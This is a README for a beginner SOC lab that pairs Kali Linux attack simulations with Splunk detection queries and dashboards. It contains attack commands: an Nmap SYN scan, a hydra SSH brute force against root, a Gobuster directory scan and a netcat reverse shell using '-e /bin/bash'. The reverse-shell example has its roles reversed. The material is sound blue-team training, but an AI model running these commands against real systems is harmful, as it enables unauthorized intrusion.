# SOC-Analyst-Lab-Real-Time-Threat-Detection-with-Splunk-Kali-Linux
# 🧪 SOC Analyst Lab: Real-Time Threat Detection with Splunk & Kali Linux

## 🧭 Introduction

This lab simulates a Security Operations Center (SOC) environment where analysts detect, investigate, and respond to real-time threats using **Splunk** and **Kali Linux**. It mimics Blue Team operations for beginners or students aiming to build hands-on detection skills.

---

## 🎯 Objectives

* Build a functional SOC lab using Splunk and Kali
* Generate and analyze suspicious events (e.g. Nmap scans, brute-force attacks)
* Develop alerting logic and dashboards in Splunk
* Simulate analyst workflows: investigation, correlation, and reporting

---

## 🛠 Lab Environment

| Component         | Role                   |
| ----------------- | ---------------------- |
| Kali Linux        | Attacker (Red Team)    |
| Splunk Free       | Log and event analysis |
| Ubuntu/Windows VM | Victim / Log Forwarder |

### Optional Tools

* `Sysmon` for Windows logging
* `UFW` or `iptables` for Linux logs
* `nginx` or test apps to simulate network traffic

---

## 🔧 Setup Steps

### 1. Install Splunk on Ubuntu VM

```bash
wget -O splunk.deb 'https://download.splunk.com/products/splunk/releases/9.0.0/linux/splunk-9.0.0-amd64.deb'
sudo dpkg -i splunk.deb
sudo /opt/splunk/bin/splunk start --accept-license
```

Create admin user and access Splunk at `http://<vm-ip>:8000`

### 2. Configure Universal Forwarder on Windows/Linux

* Download Splunk Universal Forwarder
* Install and set the receiving Splunk instance IP and port (default: 9997)
* Forward important logs: auth.log, syslog, Windows Event Logs

### 3. Enable Receiving on Splunk

* Settings > Forwarding and Receiving > Configure Receiving > Add port 9997

### 4. Add Inputs

* Settings > Data Inputs > Add new monitor: `/var/log/`, `/opt/splunkforwarder/var/log/splunk/`, etc.

---

## 🧨 Simulated Attacks (Kali Linux)

### A. Nmap Scan

```bash
nmap -sS -p 22,80,443 <target-ip>
```

* Should generate logs of port probing
* Splunk query: `index=os_logs sourcetype=auth | search "Failed password"`

### B. SSH Brute Force

```bash
hydra -l root -P rockyou.txt ssh://<target-ip>
```

* Log failed login attempts
* Create correlation search: 5+ failures in 1 minute from same IP

### C. Web Directory Scan (Gobuster)

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
```

* Detect abnormal HTTP activity
* Analyze access.log for 404 and unusual hits

### D. Netcat Reverse Shell (Simulated Malicious Payload)

```bash
# Victim (listener)
nc -lvnp 4444

# Attacker
nc <target-ip> 4444 -e /bin/bash
```

* Check for unexpected connections in netstat logs

---

## 🔎 Splunk Use Cases & Queries

### 📈 Use Case: Detect SSH Brute Force

```spl
index=linux_logs sourcetype=auth | stats count by src_ip, user | where count > 5
```

### 📈 Use Case: Detect Port Scanning

```spl
index=network sourcetype=ufw | stats count by src_ip, dest_port | where count > 10
```

### 📈 Use Case: Detect HTTP Recon

```spl
index=web_logs sourcetype=access_combined | stats count by uri_path, status | where status=404
```

### 📊 Dashboard Ideas

* Top 10 Source IPs
* Failed vs Successful Logins
* Unusual HTTP Paths
* Brute Force Timeline

---

## 🧑‍💻 Analyst Workflow

1. Monitor Splunk Dashboards
2. Detect anomalies (login failures, abnormal IPs)
3. Drill down: who, what, where?
4. Correlate events across sources
5. Escalate or close incident
6. Document IOCs and response

---

## 🧪 Project Outcomes

* Hands-on experience with log ingestion, detection logic, and threat simulation
* Practice investigating real attack patterns
* Skill development for SOC, SIEM, and Blue Team roles

---




